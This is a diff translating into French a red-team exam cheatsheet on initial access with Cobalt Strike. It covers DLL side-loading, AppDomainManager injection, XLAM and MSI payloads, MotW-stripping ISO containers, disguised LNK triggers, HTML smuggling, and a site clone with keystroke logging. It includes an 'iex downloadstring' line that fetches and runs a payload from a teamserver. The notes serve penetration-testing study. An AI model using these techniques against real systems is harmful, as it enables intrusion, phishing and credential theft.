@@ -1,14 +1,14 @@
-# Initial Access
+# Initial Access — Accès initial
 
-> Assume-breach exam scenario: foothold machine is provided with creds. No pre-running Beacon. Must bypass host-based defences to stage first Beacon. Defender is ON.
+> Scénario d'examen **assume-breach** : une machine foothold et des credentials sont fournis. Aucun Beacon n'est déjà actif. Il faut préparer le premier Beacon en tenant compte des protections endpoint, avec Defender activé.
 
-**Taxonomy:** `DELIVERY → CONTAINER → TRIGGER → PAYLOAD → DECOY`
+**Structure :** `DELIVERY → CONTAINER → TRIGGER → PAYLOAD → DECOY`
 
 ---
 
-## Pre-Flight — Defender Must Be Bypassed First
+## Vérifications préalables — Defender
 
-Before any payload lands on disk or executes, the following must be clean:
+Avant tout dépôt ou exécution de payload sur disque, les éléments suivants doivent être vérifiés :
 
 ```
 [ ] Artifact Kit built and ThreatCheck clean (Defender engine)
@@ -17,7 +17,7 @@ Before any payload lands on disk or executes, the following must be clean:
 [ ] artifact.cna + resources.cna loaded in CS Script Manager
 ```
 
-See `cheatsheets/defense-evasion.md` for the full build workflow.
+Consulter `cheatsheets/defense-evasion.md` pour le workflow de préparation complet.
 
 ---
 
@@ -25,19 +25,19 @@ See `cheatsheets/defense-evasion.md` for the full build workflow.
 
 ### DLL Side-Loading
 
-Force a legitimate application to load a malicious DLL by exploiting the Windows DLL search order.
+Faire charger une DLL par une application légitime en exploitant l'ordre de recherche des DLL sous Windows.
 
-**Find opportunities with ProcMon filter:**
+**Rechercher les possibilités avec un filtre ProcMon :**
 ```
 Path ends with .dll  AND  Result = NAME NOT FOUND
 ```
 
-**WinSxS — older vulnerable app versions stored here even after patching:**
+**WinSxS — anciennes versions d'applications encore présentes après un patch :**
 ```
 C:\Windows\WinSxS\
 ```
 
-Easiest hijack target: **current working directory** — drop DLL with correct name into CWD and run the app.
+L'emplacement le plus simple dans ce scénario est le **current working directory (CWD)** : placer la DLL sous le nom attendu et lancer l'application.
 
 ```cmd
 # Find ngentask.exe in WinSxS (older version with DLL search order vuln)
@@ -48,11 +48,11 @@ copy C:\Payloads\mscorsvc.dll .
 ngentask.exe
 ```
 
-### AppDomainManager Injection (.NET Framework apps)
+### AppDomainManager Injection — Applications .NET Framework
 
-Forces any .NET Framework app to load a custom DLL via environment variables or `.config` file.
+Cette technique utilise des variables d'environnement ou un fichier `.config` pour faire charger une DLL personnalisée à une application .NET Framework.
 
-**Method 1 — Environment Variables:**
+**Méthode 1 — Variables d'environnement :**
 
 ```cmd
 set APPDOMAIN_MANAGER_ASM=MyManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
@@ -60,7 +60,7 @@ set APPDOMAIN_MANAGER_TYPE=MyManager.MyDomainManager
 ngentask.exe
 ```
 
-**Method 2 — Config file** (filename must match app: `ngentask.exe.config`):
+**Méthode 2 — Fichier de configuration** (nom correspondant à l'application : `ngentask.exe.config`) :
 
 ```xml
 <configuration>
@@ -71,11 +71,11 @@ ngentask.exe
 </configuration>
 ```
 
-DLL must be in the same directory as the target .NET app. Over 100 .NET assemblies installed by default — copy one (e.g. `ngentask.exe`) into CWD to use as the trigger.
+La DLL doit se trouver dans le dossier de l'application .NET cible. Les notes suggèrent de copier une assembly disponible (par exemple `ngentask.exe`) dans le CWD comme déclencheur.
 
 ### Windows Installer (MSI)
 
-MSI packages trigger payload execution during the install process.
+Les packages MSI peuvent déclencher l'exécution d'un payload pendant l'installation.
 
 ```
 VS → New Project → Setup Project
@@ -85,26 +85,26 @@ VS → New Project → Setup Project
 → Build → produces .exe wrapper + .msi (deliver .msi only)
 ```
 
-> MSI installs run with user-level permissions unless UAC prompt accepted. The `.exe` wrapper is not needed — deliver `.msi` only.
+> L'installation MSI utilise les permissions utilisateur sauf si une élévation UAC est acceptée. Un wrapper `.exe` n'est pas nécessaire : seul le `.msi` est utilisé dans cet exemple.
 
 ### Excel Add-In (XLAM)
 
-XLAM files in `%APPDATA%\Microsoft\Excel\XLSTART\` execute automatically when Excel opens — bypasses Protected View (trusted location).
+Les fichiers XLAM dans `%APPDATA%\Microsoft\Excel\XLSTART\` peuvent se charger automatiquement à l'ouverture d'Excel, cet emplacement étant considéré comme trusted dans le scénario décrit.
 
 ```
 Alt+F11 → Insert Module → add macro code
 File → Save As → Excel Add-In (*.xlam) → save to C:\Payloads\
 ```
 
-**Delivery:** Copy to XLSTART (writable by standard user):
+**Delivery :** copier le fichier dans XLSTART (accessible en écriture à un utilisateur standard) :
 ```cmd
 copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\payload.xlam"
 # Executes automatically on next Excel launch — no user interaction needed
 ```
 
-### Dropper — GadgetToJScript (.NET DLL → JS/VBS/HTA)
+### Dropper — GadgetToJScript (.NET DLL vers JS/VBS/HTA)
 
-Embeds a payload inside a .NET DLL and serialises it to JavaScript. Chain: `JS → .NET DLL → EXE/DLL`.
+Intègre un payload dans une DLL .NET, puis le sérialise vers JavaScript. Chaîne : `JS → .NET DLL → EXE/DLL`.
 
 ```
 VS → New .NET Framework Class Library → add payload as Embedded Resource
@@ -119,16 +119,16 @@ GadgetToJScript.exe -a MyDropper.dll -w js -b -o dropper
 # -b: bypass .NET 4.8+ type check controls
 ```
 
-Execution: double-click `dropper.js` (wscript default handler) or `wscript dropper.js`.
+Exécution : double-cliquer sur `dropper.js` (handler wscript par défaut) ou utiliser `wscript dropper.js`.
 
-> **Safe drop paths** (writable, not default-suspicious): `C:\ProgramData\<subdir>\`
-> Avoid user home directory and `%TEMP%` — flagged by behaviour rules.
+> **Chemins de dépôt indiqués comme moins suspects dans ces notes** (accessibles en écriture) : `C:\ProgramData\<subdir>\`
+> Éviter le dossier utilisateur et `%TEMP%`, susceptibles d'être détectés par des règles comportementales.
 
 ---
 
-## Containers — Stripping Mark of the Web (MotW)
+## Containers — Gestion du Mark of the Web (MotW)
 
-MotW prevents macro execution in Office and triggers SmartScreen warnings. ISO/IMG containers do **not** propagate MotW to their contents.
+Le MotW limite l'exécution des macros Office et peut déclencher des alertes SmartScreen. D'après ces notes, les containers ISO/IMG ne transmettent pas le MotW à leur contenu.
 
 ```bash
 # PackMyPayload — pack into ISO stripping MotW
@@ -138,23 +138,23 @@ python3 PackMyPayload.py trigger.lnk payload.dll decoy.pdf output.iso
 python3 PackMyPayload.py -H payload.dll -H decoy.pdf trigger.lnk output.img
 ```
 
-**Container format comparison:**
+**Comparaison des formats de container :**
 
-| Format | MotW propagation | Native Windows support |
+| Format | Propagation MotW | Support natif Windows |
 |--------|-----------------|----------------------|
-| ISO | No | Yes (auto-mount) |
-| IMG | No | Yes (auto-mount) |
-| ZIP | Yes | Yes |
-| WIM | No | Yes |
-| 7z / RAR | Yes | No (needs 3rd party) |
+| ISO | Non | Oui (auto-mount) |
+| IMG | Non | Oui (auto-mount) |
+| ZIP | Oui | Oui |
+| WIM | Non | Oui |
+| 7z / RAR | Oui | Non (outil tiers requis) |
 
 ---
 
 ## Triggers
 
-### Shell Link (LNK) — Most Deceptive
+### Shell Link (LNK) — Raccourcis Windows
 
-`.lnk` extension hidden in Explorer even with "show extensions" on. Can have any icon. Filename `report.pdf.lnk` shows as `report.pdf`.
+Dans les conditions décrites, l'extension `.lnk` peut être masquée dans Explorer, même avec l'affichage des extensions. L'icône est personnalisable et `report.pdf.lnk` peut apparaître comme `report.pdf`.
 
 ```powershell
 $wsh = New-Object -ComObject WScript.Shell
@@ -166,13 +166,13 @@ $lnk.WindowStyle    = 7   # Minimised — no visible window
 $lnk.Save()
 ```
 
-For XLAM delivery via LNK:
+Pour la delivery d'un XLAM via LNK :
 ```powershell
 $lnk.TargetPath = "C:\Windows\System32\cmd.exe"
 $lnk.Arguments  = '/c copy payload.xlam "%APPDATA%\Microsoft\Excel\XLSTART\" & start "" decoy.xlsx'
 ```
 
-### Batch File (BAT/CMD)
+### Fichier Batch (BAT/CMD)
 
 ```batch
 @echo off
@@ -186,9 +186,9 @@ REM Open decoy
 start "" decoy.pdf
 ```
 
-### MSC (Grim Resource — mmc.exe auto-elevate)
+### MSC — Grim Resource et mmc.exe
 
-`mmc.exe` is auto-elevating — triggers UAC for local admins. MSC file embeds VBScript via XSS flaw.
+`mmc.exe` peut effectuer une élévation selon le contexte UAC. Le fichier MSC du scénario intègre du VBScript au moyen d'une faille XSS.
 
 ```
 1. Take example MSC template (GrimResource / MSC_Dropper)
@@ -202,9 +202,9 @@ start "" decoy.pdf
 
 ## Delivery
 
-### CS Host File + Site Clone
+### Cobalt Strike — Host File et Site Clone
 
-**Step 1 — Host payload:**
+**Étape 1 — Héberger le payload :**
 ```
 CS → Site Management → Host File
   File:      payload.iso (or .exe, .dll)
@@ -213,7 +213,7 @@ CS → Site Management → Host File
   Port:       80 / 443
 ```
 
-**Step 2 — Clone legitimate site and embed download:**
+**Étape 2 — Cloner le site et intégrer le téléchargement :**
 ```
 CS → Site Management → Clone Site
   Clone URL:  https://legitimate-site.com/download
@@ -223,11 +223,11 @@ CS → Site Management → Clone Site
   Log keystrokes: Yes (if cloned page has login form)
 ```
 
-Victim visits cloned URL → browser auto-downloads payload via hidden iframe.
+Le visiteur ouvre l'URL clonée ; une iframe cachée provoque le téléchargement automatique du payload dans cet exemple.
 
 ### HTML Smuggling
 
-Encodes payload in base64 inside HTML — bypasses content inspection gateways (no `application/octet-stream` traffic).
+Encode le payload en Base64 dans du HTML plutôt que de transférer un flux `application/octet-stream` ; le trafic possède un profil différent face aux contrôles de contenu.
 
 ```html
 <script>
@@ -247,15 +247,15 @@ Encodes payload in base64 inside HTML — bypasses content inspection gateways (
 <button onclick="downloadFile()">View Document</button>
 ```
 
-> Enhance with Web Crypto API (AES encrypt content) + JS obfuscation to defeat gateway inspection.
+> Les notes évoquent l'utilisation de Web Crypto API (AES) et de l'obfuscation JavaScript pour modifier le profil du contenu vis-à-vis des passerelles.
 
 ### SVG Smuggling
 
-Same as HTML smuggling but in `.svg` format — triggers if Edge is the default SVG handler.
+Même principe que HTML Smuggling au format `.svg`, avec déclenchement si Edge est le handler SVG par défaut.
 
 ---
 
-## CS Scripted Web Delivery — Fastest Lab/Exam First Beacon
+## Cobalt Strike Scripted Web Delivery — Premier Beacon
 
 ```
 CS → Attacks → Scripted Web Delivery
@@ -264,42 +264,42 @@ CS → Attacks → Scripted Web Delivery
   Launch → copy URL
 ```
 
-On foothold machine (PowerShell):
+Sur la machine foothold (PowerShell) :
 ```powershell
 iex (new-object net.webclient).downloadstring('http://<teamserver>/payload_url')
 ```
 
-> Requires Artifact Kit + Resource Kit loaded and profile active first — otherwise Defender will block.
+> Nécessite le chargement préalable de l'Artifact Kit et du Resource Kit ainsi qu'un profile actif ; sinon, Defender peut bloquer l'exécution.
 
 ---
 
-## Code Signing (Context)
+## Code Signing — Contexte
 
-| Certificate Type | SmartScreen Effect | How Obtained |
+| Type de certificat | Effet SmartScreen | Obtention |
 |-----------------|-------------------|--------------|
-| Standard | Signed, but "Unknown Publisher" still shown | Buy from DigiCert / GlobalSign |
-| EV (Extended Validation) | Fully trusted — removes all warnings | Requires business vetting |
+| Standard | Signé, mais « Unknown Publisher » peut rester affiché | Achat DigiCert / GlobalSign |
+| EV (Extended Validation) | Considéré comme plus fiable dans ces notes | Vérifications d'entreprise requises |
 
-> For exam: code signing is not required but reduces friction. Do not sign payloads with a cert traceable to your real identity — it will be revoked if the file is submitted to VirusTotal.
+> Pour l'examen, la signature de code n'est pas exigée selon ces notes. Elles recommandent de ne pas associer l'identité réelle à un certificat utilisé pour signer un payload qui pourrait être soumis à VirusTotal.
 
 ---
 
-## Initial Access OPSEC Summary
+## Récapitulatif OPSEC — Initial Access
 
-| Technique | OPSEC | Notes |
+| Technique | OPSEC | Remarques |
 |-----------|-------|-------|
-| ISO container + LNK trigger | SAFE | Strips MotW, no direct execution from untrusted path |
-| AppDomainManager injection | SAFE | Runs inside legit .NET process, no child cmd.exe |
-| DLL side-loading via WinSxS | SAFE | Legit process loads DLL — no new suspicious process |
-| XLAM auto-load via XLSTART | SAFE | Executes inside Excel — no suspicious parent |
-| GadgetToJScript JS dropper | CAUTION | wscript.exe spawning — monitor parent-child chain |
-| MSI install | CAUTION | Installer process visible, writes to disk |
-| Scripted Web Delivery (PS) | CAUTION | IEX download — AMSI applies, resource kit must be clean |
-| BAT/CMD trigger | UNSAFE | cmd.exe spawns visible in EDR process tree |
+| Container ISO + trigger LNK | SAFE | MotW non transmis selon les notes ; pas d'exécution directe depuis un chemin non fiable |
+| AppDomainManager Injection | SAFE | Exécution dans un processus .NET légitime, sans child cmd.exe |
+| DLL Side-Loading via WinSxS | SAFE | Chargement DLL par un processus légitime |
+| Auto-load XLAM via XLSTART | SAFE | Exécution dans Excel, sans parent inhabituel |
+| Dropper JS GadgetToJScript | CAUTION | Lancement de wscript.exe ; surveiller la chaîne parent–child |
+| Installation MSI | CAUTION | Processus installer visible, écrit sur disque |
+| Scripted Web Delivery (PS) | CAUTION | Téléchargement IEX ; AMSI s'applique et le Resource Kit doit être préparé |
+| Trigger BAT/CMD | UNSAFE | cmd.exe visible dans l'arbre des processus EDR |
 
 ---
 
-## Quick Reference
+## Référence rapide
 
 ```
 FIRST BEACON:    CS → Attacks → Scripted Web Delivery → iex downloadstring
